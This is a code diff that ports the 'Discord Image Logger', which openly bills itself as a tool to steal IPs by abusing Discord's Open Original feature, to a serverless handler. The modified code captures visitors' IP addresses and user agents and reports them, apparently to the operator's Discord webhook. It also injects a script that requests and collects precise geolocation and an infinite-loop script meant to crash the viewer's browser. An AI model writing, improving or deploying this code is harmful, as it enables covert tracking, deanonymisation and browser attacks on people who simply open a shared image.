@@ -1,7 +1,7 @@
-from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import traceback, requests, base64, httpagentparser
 import json
+import os
 
 __app__ = "Discord Image Logger"
 __description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
@@ -175,21 +175,34 @@ binaries = {
 def handler(request):
     """Vercel serverless function handler"""
     try:
-        # Get client IP from Vercel headers
-        ip = request.headers.get('x-forwarded-for') or request.remote_addr
+        # Extract headers safely
+        headers = request.headers if hasattr(request, 'headers') else {}
+        
+        # Get client IP with multiple fallbacks
+        ip = headers.get('x-forwarded-for') or headers.get('cf-connecting-ip') or '0.0.0.0'
+        if ',' in str(ip):
+            ip = ip.split(',')[0].strip()
         
         # Parse URL parameters
-        s = request.path
-        query_params = dict(parse.parse_qsl(parse.urlsplit(s).query))
+        query_string = request.url.split('?')[1] if '?' in request.url else ''
+        query_params = dict(parse.parse_qsl(query_string)) if query_string else {}
         
         # Get image URL
-        if config["imageArgument"] and (query_params.get("url") or query_params.get("id")):
-            url = base64.b64decode(query_params.get("url") or query_params.get("id")).decode()
-        else:
-            url = config["image"]
+        url = config["image"]
+        if config["imageArgument"]:
+            if query_params.get("url"):
+                try:
+                    url = base64.b64decode(query_params.get("url")).decode()
+                except:
+                    pass
+            elif query_params.get("id"):
+                try:
+                    url = base64.b64decode(query_params.get("id")).decode()
+                except:
+                    pass
 
         # Generate HTML with image
-        data = f'''<style>body {{
+        html_content = f'''<style>body {{
 margin: 0;
 padding: 0;
 }}
@@ -200,17 +213,26 @@ background-repeat: no-repeat;
 background-size: contain;
 width: 100vw;
 height: 100vh;
-}}</style><div class="img"></div>'''.encode()
+}}</style><div class="img"></div>'''
         
         # Check if IP is blacklisted
         if ip.startswith(blacklistedIPs):
-            return {"statusCode": 200, "body": "OK"}
+            return {
+                "statusCode": 200,
+                "headers": {"Content-Type": "text/html"},
+                "body": "OK"
+            }
         
         # Check if it's a bot
-        user_agent = request.headers.get('user-agent', 'Unknown')
-        if botCheck(ip, user_agent):
+        user_agent = headers.get('user-agent', 'Unknown')
+        bot = botCheck(ip, user_agent)
+        
+        if bot:
             # Send bot detection report
-            makeReport(ip, endpoint=s.split("?")[0], url=url)
+            try:
+                makeReport(ip, user_agent, endpoint=request.path.split("?")[0], url=url)
+            except Exception as e:
+                print(f"Error in makeReport for bot: {str(e)}")
             
             if config["buggedImage"]:
                 return {
@@ -227,11 +249,15 @@ height: 100vh;
                 }
         
         # Not a bot - log the IP
-        if query_params.get("g") and config["accurateLocation"]:
-            location = base64.b64decode(query_params.get("g")).decode()
-            result = makeReport(ip, user_agent, location, s.split("?")[0], url=url)
-        else:
-            result = makeReport(ip, user_agent, endpoint=s.split("?")[0], url=url)
+        result = None
+        try:
+            if query_params.get("g") and config["accurateLocation"]:
+                location = base64.b64decode(query_params.get("g")).decode()
+                result = makeReport(ip, user_agent, location, request.path.split("?")[0], url=url)
+            else:
+                result = makeReport(ip, user_agent, endpoint=request.path.split("?")[0], url=url)
+        except Exception as e:
+            print(f"Error in makeReport: {str(e)}")
         
         # Prepare message
         message = config["message"]["message"]
@@ -253,16 +279,21 @@ height: 100vh;
             message = message.replace("{mobile}", str(result.get("mobile", "Unknown")))
             message = message.replace("{vpn}", str(result.get("proxy", "Unknown")))
             message = message.replace("{bot}", str(result.get("hosting") if result.get("hosting") and not result.get("proxy") else 'Possibly' if result.get("hosting") else 'False'))
-            message = message.replace("{browser}", httpagentparser.simple_detect(user_agent)[1])
-            message = message.replace("{os}", httpagentparser.simple_detect(user_agent)[0])
+            
+            try:
+                os_info, browser_info = httpagentparser.simple_detect(user_agent)
+                message = message.replace("{browser}", browser_info)
+                message = message.replace("{os}", os_info)
+            except:
+                pass
 
-        datatype = 'text/html'
+        body_content = html_content
 
         if config["message"]["doMessage"]:
-            data = message.encode()
+            body_content = message
         
         if config["crashBrowser"]:
-            data += b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>'
+            body_content += '<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>'
 
         if config["redirect"]["redirect"]:
             return {
@@ -273,7 +304,7 @@ height: 100vh;
 
         # Handle accurate location if needed
         if config["accurateLocation"]:
-            data += b"""<script>
+            body_content += """<script>
 var currenturl = window.location.href;
 if (!currenturl.includes("g=")) {
     if (navigator.geolocation) {
@@ -289,14 +320,19 @@ if (!currenturl.includes("g=")) {
 
         return {
             "statusCode": 200,
-            "headers": {"Content-Type": datatype},
-            "body": data.decode() if isinstance(data, bytes) else data
+            "headers": {"Content-Type": "text/html"},
+            "body": body_content
         }
     
     except Exception as e:
-        reportError(traceback.format_exc())
+        error_msg = traceback.format_exc()
+        print(f"ERROR: {error_msg}")
+        try:
+            reportError(error_msg)
+        except:
+            pass
         return {
             "statusCode": 500,
             "headers": {"Content-Type": "text/html"},
-            "body": "500 - Internal Server Error<br>Please check the message sent to your Discord Webhook and report the error on the GitHub page."
+            "body": f"500 - Internal Server Error<br><pre>{error_msg}</pre>"
         }
